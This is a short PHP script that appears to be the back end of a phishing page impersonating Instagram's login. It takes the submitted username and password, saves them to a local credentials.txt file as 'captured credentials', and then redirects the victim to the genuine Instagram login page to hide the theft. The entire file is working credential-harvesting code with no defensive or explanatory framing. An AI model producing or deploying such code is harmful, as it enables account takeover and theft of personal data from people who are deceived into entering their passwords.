<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the captured credentials to a file or database
    file_put_contents('credentials.txt', $username . ':' . $password);

    // Redirect the user to the real Instagram login page
    header('Location: https://www.instagram.com/accounts/login/');
